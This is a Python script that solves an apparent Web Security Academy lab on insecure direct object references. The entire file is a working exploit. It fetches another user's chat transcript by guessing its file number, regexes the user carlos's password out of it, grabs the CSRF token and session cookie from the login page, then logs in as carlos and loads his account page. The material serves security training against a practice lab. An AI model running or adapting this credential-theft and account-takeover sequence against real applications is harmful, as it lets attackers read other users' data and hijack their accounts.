#####################################################################
#
# Lab: Insecure direct object references
#
# Hack Steps: 
#      1. Fetch 1.txt log file
#      2. Extract carlos password from the log file
#      3. Fetch the login page to get valid session and csrf token
#      4. Login as carlos
#
######################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aa500750337684781e4ad0c00d800e7.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the 1.txt log file.. ", end="", flush=True)
 
    log_file = fetch("/download-transcript/1.txt")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting password from the log file.. ", end="", flush=True)
    
    carlos_password = re.findall(r"password is (.*)\.", log_file.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + carlos_password)
    print(Fore.WHITE + "⦗3⦘ Fetching the login page to get a valid session and the csrf token.. ", end="", flush=True)

    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Logging in as carlos.. ", end="", flush=True)
    
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    data = { "username": "carlos", "password": carlos_password, "csrf": csrf_token }
    session = login_page.cookies.get("session")
    cookies = { "session": session }
    login_as_carlos = post_data("/login", data, cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Fetching carlos profile.. ", end="", flush=True)

    carlos_session = login_as_carlos.cookies.get("session")
    cookies = { "session": carlos_session }
    fetch("/my-account", cookies=cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
